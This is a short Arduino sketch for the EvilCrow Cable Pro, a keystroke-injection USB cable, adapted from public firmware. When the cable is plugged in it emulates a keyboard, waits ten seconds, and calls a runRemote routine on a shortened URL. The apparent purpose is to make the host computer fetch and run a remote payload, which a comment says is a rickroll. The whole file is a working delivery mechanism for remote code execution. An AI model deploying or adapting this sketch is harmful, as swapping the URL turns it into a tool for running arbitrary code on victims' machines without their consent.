#include <USBCrowKeyboard.h>
#include "payload.h"

// based on https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main/firmware, edited by @kaliiiiiiiiii

char URL[] = "is.gd/tuipm"; // Payload 2 | rickroll

void setup() {
  Serial.begin(115200);
  Keyboard.begin();

  delay(10000); // 10s delay
  runRemote(URL);

  delay(100);
  Keyboard.end();
}

void loop(){}